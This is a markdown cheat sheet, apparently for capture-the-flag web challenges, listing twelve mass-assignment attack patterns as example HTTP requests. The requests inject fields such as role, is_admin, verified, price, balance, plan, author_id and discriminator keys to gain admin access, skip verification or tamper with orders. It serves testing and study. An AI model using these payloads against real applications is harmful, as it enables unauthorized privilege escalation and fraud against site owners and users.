# Attack shapes — the canonical mass-assignment chains

## Shape 1 — register-time privilege

```
POST /register {"username":"x","password":"p","role":"admin"}
→ role lands → GET /api/me shows "role":"admin"
→ GET /admin → 200 + privileged data/flag
```

The classic: the register binder accepts an unlisted field, the gate
reads `role` from the stored record.

## Shape 2 — profile-escalation

```
PATCH /users/me {"role":"admin"}         # or {"is_admin":true}
→ PATCH binder wider than register
→ next request carries the role → admin route opens
```

The update binder is the usual live surface — register allowlists,
profile-edit doesn't.

## Shape 3 — verification-skip

```
POST /register {"username":"x","verified":true,"is_active":true}
→ account active without the email step
→ the verify-gated flag route opens directly
```

`email_verified_at`, `activated`, `onboarding_complete` variants.

## Shape 4 — economic override

```
POST /orders {"item":1,"price":0,"discount":100}
→ the bound price/discount reaches the total
→ checkout completes at the bound value
```

`total`, `unit_price`, `currency`, `shipping`, `tax` — the field the
totals code reads is the target.

## Shape 5 — balance graft

```
PATCH /users/me {"balance":999999,"credits":999999}
→ balance bound → spend at the bound amount → prize/flag item
```

## Shape 6 — plan theft

```
PATCH /users/me {"plan":"enterprise","tier":"pro",
                 "subscription":{"type":"lifetime"}}
→ premium route opens → the flag lives behind /premium
```

## Shape 7 — ownership forgery

```
POST /notes {"author_id":1,"content":"x"}
→ note authored as user 1 → the admin's feed shows it
→ admin bot clicks → XSS reach (chain into web-xss)
```

## Shape 8 — workflow injection

```
POST /orders {"status":"shipped"}        # skip fulfillment
POST /flag-submissions {"correct":true}  # bound the result
```

Status fields skipping the intended workflow — logic-flaw through the
binder.

## Shape 9 — the chained role

```
PATCH /users/me {"role":"admin"}  →  GET /admin → 200
POST /admin/users {"username":"x","role":"admin","is_admin":true,
                   "flag_visible":true}   # the admin binder's own MA
```

Bound role → admin binder → second mass-assignment writing the flag-
visible field. Two-layer.

## Shape 10 — the nested tunnel

```
PATCH /users/me {"profile":{"role":"admin","settings":{"admin":true}}}
→ flat allowlist drops "role" but allows "profile"
→ deep merge reaches profile.role → stored
```

## Shape 11 — type-coercion

```
POST /register {"role":true}        # boolean column
POST /register {"role":1}           # integer/enum index
POST /register {"groups":[{"id":1}]} # FK array shape
```

The scalar vs typed pair — when `role:"admin"` is filtered by type.

## Shape 12 — the discriminator switch

```
POST /register {"_t":"AdminUser"}         # Mongoose discriminator
→ the sub-schema switches to the privileged type
```

`_t`, `__t`, `type`, `user_type` — the discriminator fields nobody
guards.
